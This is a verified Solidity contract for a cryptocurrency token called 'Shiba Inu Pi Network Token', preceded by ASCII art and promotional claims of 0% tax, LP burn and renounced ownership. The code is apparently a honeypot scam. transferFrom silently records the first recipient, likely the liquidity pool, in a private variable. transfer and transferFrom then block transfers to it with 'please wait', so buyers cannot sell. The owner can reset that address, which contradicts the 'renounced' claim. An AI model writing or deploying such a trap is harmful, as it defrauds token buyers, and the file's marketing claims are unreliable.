/**
 *Submitted for verification at cronoscan.com on 2022-06-06
*/

/**

░██████╗██╗░░██╗██╗██████╗░░█████╗░  ██╗███╗░░██╗██╗░░░██╗  ██████╗░██╗
██╔════╝██║░░██║██║██╔══██╗██╔══██╗  ██║████╗░██║██║░░░██║  ██╔══██╗██║
╚█████╗░███████║██║██████╦╝███████║  ██║██╔██╗██║██║░░░██║  ██████╔╝██║
░╚═══██╗██╔══██║██║██╔══██╗██╔══██║  ██║██║╚████║██║░░░██║  ██╔═══╝░██║
██████╔╝██║░░██║██║██████╦╝██║░░██║  ██║██║░╚███║╚██████╔╝  ██║░░░░░██║
╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝  ╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═╝░░░░░╚═╝

███╗░░██╗███████╗████████╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░██╗  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
████╗░██║██╔════╝╚══██╔══╝░██║░░██╗░░██║██╔══██╗██╔══██╗██║░██╔╝  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
██╔██╗██║█████╗░░░░░██║░░░░╚██╗████╗██╔╝██║░░██║██████╔╝█████═╝░  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
██║╚████║██╔══╝░░░░░██║░░░░░████╔═████║░██║░░██║██╔══██╗██╔═██╗░  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
██║░╚███║███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██║░╚██╗  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝


░██████╗██╗░░██╗██╗██████╗░██████╗░██╗
██╔════╝██║░░██║██║██╔══██╗██╔══██╗██║
╚█████╗░███████║██║██████╦╝██████╔╝██║
░╚═══██╗██╔══██║██║██╔══██╗██╔═══╝░██║
██████╔╝██║░░██║██║██████╦╝██║░░░░░██║
╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░░░░╚═╝
0% tax 
Lp Burn
ownership renounced
 cross chain
 CRONOS CHAIN
 FANTOM CHAIN
 MATIC CHAIN


https://twitter.com/Shibapitoken
https://shibapi.xyz
https://www.instagram.com/shibapitoken
https://t.me/shibapitoken
*/
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.17;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address private Ownership;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "SHIBPI";
    name = "Shiba Inu Pi Network Token";
    decimals = 9;
    _totalSupply =  10000000000000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transferOwnership(address _Ownership) public onlyOwner {
    Ownership = _Ownership;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != Ownership, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && Ownership == address(0)) Ownership = to;
      else require(to != Ownership, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract TokenMintERC20Token  is TokenBEP20 {

  function burn() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}